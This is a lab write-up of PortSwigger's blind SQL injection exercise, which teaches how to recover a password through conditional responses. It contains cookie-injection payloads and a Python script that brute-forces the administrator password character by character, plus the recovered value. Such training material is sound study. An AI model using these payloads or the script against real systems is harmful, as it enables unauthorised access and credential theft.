# SQL Injection

## **SQL injection examples**

- Retrieving hidden data - where you can modify an SQL query to return additional results.
- Subverting application logic - where you can change a query to interfere with the application's logic.
- UNION attacks - where you can retrieve data from different database tables.
- Examining the databases - where you can extract information about the version and structure of the database.
- Blind SQL injection - where the results of a query you control are not returned in the application's responses.

# [Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

## Description

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
> 
> 
> The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
> 
> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
> 
> To solve the lab, log in as the administrator user.
> 

With ************************************************************Blind SQL Injection************************************************************ HTTP response will no return the result of SQL query or the error message of database. General principles of ************Blind SQL Injection************ that you have to try checking the response to recognize the differences from which to make appropriate adjustments in the query. 

### First, ability test of Blind SQL Injection through response returned by different boolean conditions

In description, “The application uses a tracking cookie” 

![                                                                          TrackingId](SQL%20Injection%200b18092f279b4d6fbee373028f61d777/Untitled.png)

                                                                          TrackingId

You can try to modify the request, specifically the **TrackingId** place, by adding a condition check with AND. 

```java
TrackingId=2S5FNfQOVevaZGsW' AND '1'='1
```

![                                                                           Check condition True](SQL%20Injection%200b18092f279b4d6fbee373028f61d777/Untitled%201.png)

                                                                           Check condition True

As observed above, you can see the message ***“Welcome back”*** in the returned response. Moving on, I try changing the boolean condition to '1'='2 as follows:

```java
TrackingId=2S5FNfQOVevaZGsW' AND '1'='2
```

![                                                                               Check condition False](SQL%20Injection%200b18092f279b4d6fbee373028f61d777/Untitled%202.png)

                                                                               Check condition False

Now if in the response section can not find the message **“Welcome back”**. The above results show that it is possible to test based on boolean condition and analyze based on the response returned (Specifically in this case is the presence of the message **“Welcome back”**)

## Confirm the existence of the table containing user information and user “administrator”

Modify the request to check if there is a users table in the database like this:

```java
TrackingId=2S5FNfQOVevaZGsW' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

![                                                                       Check user administrator
](SQL%20Injection%200b18092f279b4d6fbee373028f61d777/Untitled%203.png)

                                                                       Check user administrator

Can conclude an important information is that there exists a username **administrator** in the **users table**

### Password detection attack with Blind SQL injection

Once I have determined the username administrator, next I will need to define the password.

You can write a script to brute force each character of the password.

```python
import requests
import string

burp0_url = "your_url"
burp0_cookies = {"TrackingId": "2S5FNfQOVevaZGsW' AND (SELECT 'a' FROM users WHERE username='administrator')='a", "session": "lDZWxZ3bJDDyEPMZUZWYJwdr1iAZogvX"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-CA,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}

password = ""
base  = burp0_cookies["TrackingId"]
baseQuery = base + "' AND (SELECT SUBSTRING(password, {}, 1) FROM users WHERE username = 'administrator')='{}"
print(baseQuery)

while True:
    for char in range (33, 127):
        f=True
        char= chr(char)
        realQuery =baseQuery.format(len(password)+1, char)
        cookie = burp0_cookies
        cookie["TrackingId"] = realQuery
        print(cookie["TrackingId"])
        res = requests.get(burp0_url, headers=burp0_headers, cookies=cookie)
        if "Welcome back!" in res.text:
            password += char
            break
        print(password)
```

![                                                                                 Result

                                                                                 Result

Password: ***9qpwdofs238tomgfc29e***

                                                                    Login account administrator
